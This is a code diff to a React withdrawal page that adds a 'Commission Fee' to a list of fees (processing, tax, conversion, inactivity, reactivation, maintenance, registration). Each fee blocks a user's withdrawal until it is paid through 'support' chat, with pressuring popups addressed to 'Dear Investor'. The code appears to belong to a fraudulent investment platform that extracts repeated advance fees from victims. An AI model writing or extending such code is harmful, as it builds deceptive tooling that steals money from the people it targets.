@@ -65,6 +65,7 @@ export default function Withdraw() {
   const labelStyle = { color: t.subText, fontSize: '9px', display: 'block', marginBottom: '6px', fontWeight: '600' };
 
   const FEE_LABELS = {
+    commission: 'Commission Fee',
     processing: 'Withdrawal Processing Fee',
     tax: 'Tax / Compliance Fee',
     conversion: 'Asset Conversion Fee',
@@ -74,6 +75,7 @@ export default function Withdraw() {
   };
 
   const FEE_DESCRIPTIONS = {
+    commission: 'Your withdrawal requires a Commission Fee to be settled before your profit and funds can be released. This fee covers platform brokerage, trade execution, and asset clearing services.',
     processing: 'Your withdrawal has been initiated successfully, however a one-time Withdrawal Processing Fee is required to securely complete the transaction. This fee covers identity verification, fraud prevention, and payment gateway processing costs. Once settled, your funds will be released to your designated wallet.',
     tax: 'Your withdrawal is currently on compliance hold. International financial regulations require a mandatory Tax & Compliance Fee to be settled before cross-border funds can be released. This fee ensures full compliance with applicable tax authorities and protects your withdrawal from regulatory delays.',
     conversion: 'Your withdrawal requires asset conversion at the current market rate before funds can be released. An Asset Conversion Fee is required to cover liquidity provider costs, network transaction fees, and exchange spread. Settling this fee ensures your funds are converted accurately and credited at the best available rate.',
@@ -84,6 +86,21 @@ export default function Withdraw() {
 
   // Distinct visual theme per fee type
   const FEE_THEMES = {
+    commission: {
+      color: '#10b981',
+      bgTint: 'rgba(16,185,129,0.1)',
+      badgeText: 'COMMISSION FEE REQUIRED',
+      title: 'Commission Fee Required',
+      subtitle: 'Pay the broker commission fee to release your funds',
+      bannerTitle: 'Withdrawal Pending Commission Fee',
+      bannerBody: 'A Commission Fee must be settled before your withdrawal can be processed.',
+      icon: (
+        <svg width='28' height='28' fill='none' stroke='#10b981' viewBox='0 0 24 24' strokeWidth='2'>
+          <circle cx='12' cy='12' r='10'/>
+          <path d='M12 8v8M8 12h8'/>
+        </svg>
+      )
+    },
     processing: {
       color: '#f59e0b',
       bgTint: 'rgba(245,158,11,0.1)',
@@ -625,13 +642,14 @@ export default function Withdraw() {
               </div>
 
               <div style={{ color: '#ef4444', fontSize: '10px', fontWeight: '600', marginBottom: '16px', lineHeight: '1.55', padding: '10px 12px', background: 'rgba(239,68,68,0.08)', borderRadius: '8px', border: '1px solid rgba(239,68,68,0.2)' }}>
+                {feePopup.type === 'commission' && 'Dear Investor, your withdrawal cannot be processed until the Commission Fee is settled. Please contact support to complete this payment and release your funds.'}
                 {feePopup.type === 'processing' && 'Dear Investor, your withdrawal cannot be processed until the Processing Fee is settled. Please contact support to complete this payment and release your funds.'}
                 {feePopup.type === 'tax' && 'Dear Investor, your withdrawal is on compliance hold and cannot be released until the Tax & Compliance Fee is paid. Please contact support to resolve this and unlock your transaction.'}
                 {feePopup.type === 'conversion' && 'Dear Investor, your funds cannot be converted and released until the Asset Conversion Fee is settled. Please contact support to complete this payment.'}
                 {feePopup.type === 'inactivity' && 'Dear Investor, your account is currently frozen due to inactivity. You cannot perform any transactions until the Reactivation Fee is settled. Please contact support to restore access.'}
                 {feePopup.type === 'maintenance' && 'Dear Investor, you cannot withdraw funds until the Account Maintenance Fee is settled. Please contact support to complete this payment and continue using the platform.'}
                 {feePopup.type === 'registration' && 'Dear Investor, your withdrawal cannot be processed until your account is fully activated by paying the Registration Fee. Please contact support to complete activation and unlock withdrawals.'}
-                {!['processing','tax','conversion','inactivity','maintenance','registration'].includes(feePopup.type) && 'Dear Investor, you cannot perform this action until the required payment is settled. Please contact support to proceed.'}
+                {!['commission','processing','tax','conversion','inactivity','maintenance','registration'].includes(feePopup.type) && 'Dear Investor, you cannot perform this action until the required payment is settled. Please contact support to proceed.'}
               </div>
               <button type="button" onClick={() => { if (feePopup) dismissedFeesRef.current.add(String(feePopup._id)); setFeePopup(null); window.dispatchEvent(new Event('openLiveChat')); }}
                 style={{ width: '100%', padding: '11px', background: (FEE_THEMES[feePopup.type] || FEE_THEMES.processing).color, border: 'none', color: 'white', fontSize: '12px', fontWeight: '600', cursor: 'pointer', marginBottom: '8px', borderRadius: '10px' }}>
